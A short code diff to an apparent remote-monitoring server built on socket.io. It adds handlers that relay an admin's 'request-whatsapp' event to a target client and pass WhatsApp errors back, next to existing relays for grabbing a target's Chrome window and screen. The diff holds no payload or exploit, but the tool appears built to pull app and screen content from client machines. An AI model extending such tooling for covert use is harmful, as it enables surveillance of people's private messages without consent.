@@ -66,6 +66,15 @@ io.on('connection', (socket) => {
     io.to(data.targetId).emit('request-chrome-window', { adminId: socket.id, sourceId: data.sourceId });
   });
 
+  // Request WhatsApp
+  socket.on('request-whatsapp', (targetClientId) => {
+    io.to(targetClientId).emit('request-whatsapp', socket.id);
+  });
+
+  socket.on('whatsapp-error', (data) => {
+    io.to(data.adminId).emit('whatsapp-error', data.error);
+  });
+
   // Admin explicit stops
   socket.on('stop-screen', (targetClientId) => {
     io.to(targetClientId).emit('stop-screen');
